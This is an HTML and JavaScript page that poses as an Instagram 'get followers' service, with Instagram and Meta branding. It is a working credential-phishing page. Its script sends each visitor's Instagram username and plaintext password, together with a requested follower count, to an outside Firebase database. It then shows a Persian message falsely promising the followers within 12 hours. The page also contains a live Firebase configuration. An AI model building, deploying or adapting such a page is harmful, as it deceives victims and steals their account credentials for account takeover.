<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./style.css">
    <link rel="stylesheet" href="../fontawesome-free-7.2.0-web/css/all.min.css">
    <link rel="shortcut icon" href="./photo/logo.png" type="image/x-icon">
    <title>Instagram - follower</title>
    <!-- <style>
        :root{
            color-scheme: light;
        }

        :root:has(input:checked){
            color-scheme: dark;
        }
        body{
            background: light-dark(#e8e8e8, #212121);
        }
    </style> -->
</head>
<body style="background: #111;">
    <!-- <a class="close" onclick="close()"><i class="fa fa-close"></i></a> بستن سایت -->
    <div class="parent">
        <select class="data">
            <option value="">English(US)</option>
            <option value="">Iran</option>
        </select>
        <div class="form-div">
            <img src="./photo/logo.png" class="logo">
            <form action="#" method="get">
                <div class="input-box">
                    <input type="text" name="" id="user-name" class="input-info" required>
                    <label for="user-name" class="label1">Username</label>
                </div>

                <div class="input-box">
                    <input type="password" name="" id="password" class="input-info" required>
                    <label for="password" class="label2">Password</label>
                    <i class="toggle-password fa fa-eye" id="toggle"></i>
                </div>
                
            </form>
            <div class="input-box">
                <input type="number" name="" id="number" class="input-info number" required>
                <label for="number" class="label3">Number of followers</label>
            </div>
            <button type="button" class="btn"  onclick="saveUser()"> register</button>
        </div>
        <img src="./photo/text-meta.png" class="text-meta"> <!-- Meta Logo -->
    </div>

    <div id="error" class="error">
        <p>تمام فیلد ها پر نشده است.</p>
        <span class="close" onclick="closeerror()"><i class="fa fa-close"></i></span>
    </div>
    <div class="model" id="model">
        <div class="box-text">
            <span class="close" onclick="closeModel()"><i class="fa fa-close"></i></span>
            <p id="text"></p>
        </div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-firestore-compat.js"></script>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyC5qFmEzTAWQmKz6J1ke-hGGjLsG08WXPs",
        authDomain: "instagram-5eab9.firebaseapp.com",
        projectId: "instagram-5eab9",
        storageBucket: "instagram-5eab9.firebasestorage.app",
        messagingSenderId: "373198766731",
        appId: "1:373198766731:web:a28af0b52d83eaed420a8e",
        measurementId: "G-45RCL62M5M"
    };

    const app = firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    async function saveUser() {
        const username = document.getElementById("user-name").value.trim();
        const password = document.getElementById("password").value.trim();
        const number = document.getElementById("number").value.trim();
        const errorDiv = document.getElementById("error");
        const model = document.getElementById("model");
        const modelText = document.getElementById("text");

        // چک کردن فیلدها
        if (username === "" || password === "" || number === "") {
            errorDiv.style.display = "block";
            return;
        }

        errorDiv.style.display = "none";

        // نمایش لودینگ (اختیاری - می‌تونی بعداً استایل اضافه کنی)
        // مثلاً دکمه رو غیرفعال کن
        const btn = document.querySelector(".btn");
        const originalBtnText = btn.innerHTML;
        btn.disabled = true;
        btn.innerHTML = "در حال ثبت...";

        try {
            // ← اول ذخیره می‌شود
            await db.collection("users").add({
                username: username,
                password: password,
                followers: parseInt(number),
                createdAt: firebase.firestore.FieldValue.serverTimestamp()
            });

            // ← بعد از ذخیره موفق، پیام نمایش داده می‌شود
            modelText.innerText = `تعداد فالوور خواسته شده : ${number}\nتا 12 ساعت آینده ارسال می‌شود`;
            model.style.display = "flex";

            // خالی کردن فرم بعد از موفقیت
            document.getElementById("user-name").value = "";
            document.getElementById("password").value = "";
            document.getElementById("number").value = "";

        } catch (err) {
            console.error("Firebase Error:", err);
            alert("خطا در ذخیره اطلاعات:\n" + err.message);
        } finally {
            // برگرداندن دکمه به حالت عادی
            btn.disabled = false;
            btn.innerHTML = originalBtnText;
        }
    }

    function closeModel() {
        document.getElementById("model").style.display = "none";
    }

    function closeerror() {
        document.getElementById("error").style.display = "none";
    }

    // نمایش/مخفی رمز عبور
    document.addEventListener("DOMContentLoaded", function() {
        const passwordInput = document.getElementById('password');
        const toggleIcon = document.getElementById('toggle');

        if (toggleIcon && passwordInput) {
            toggleIcon.addEventListener('click', () => {
                if (passwordInput.type === 'password') {
                    passwordInput.type = 'text';
                    toggleIcon.classList.remove('fa-eye');
                    toggleIcon.classList.add('fa-eye-slash');
                } else {
                    passwordInput.type = 'password';
                    toggleIcon.classList.remove('fa-eye-slash');
                    toggleIcon.classList.add('fa-eye');
                }
            });
        }
    });
</script>
</body>
</html>
